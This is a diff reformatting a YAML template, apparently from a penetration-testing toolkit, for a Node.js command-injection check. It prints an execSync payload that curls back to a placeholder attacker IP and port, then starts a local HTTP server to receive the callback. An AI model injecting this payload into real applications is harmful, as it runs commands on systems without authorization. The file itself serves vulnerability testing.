@@ -1,16 +1,14 @@
----
 metadata:
-  filename: "nodejs-command-injection.yaml"
-  tags: ["web"]
-  created: "2025-03-29"
-  author: "@anakles"
-
-content: |
-  mkdir -p packstation/outbound; \
-  echo '================================================================'; \
-  echo '                       -----Application------                         '; \
-  echo 'Deliver payload: require("child_process").execSync("curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/callback");'; \
-  echo '                       -----Linux------                         '; \
-  echo 'Observe the callback below:                                     '; \
-  echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  filename: nodejs-command-injection.yaml
+  tags:
+  - web
+  created: '2025-03-29'
+  author: '@anakles'
+content: "mkdir -p packstation/outbound; \\\necho '================================================================';\
+  \ \\\necho '                       -----Application------                      \
+  \   '; \\\necho 'Deliver payload: require(\"child_process\").execSync(\"curl http://{{\
+  \ attacker_ip }}:{{ delivery_outbound_port }}/callback\");'; \\\necho '        \
+  \               -----Linux------                         '; \\\necho 'Observe the\
+  \ callback below:                                     '; \\\necho '================================================================';\
+  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
+  \ delivery_outbound_port }} -d packstation/outbound\n"
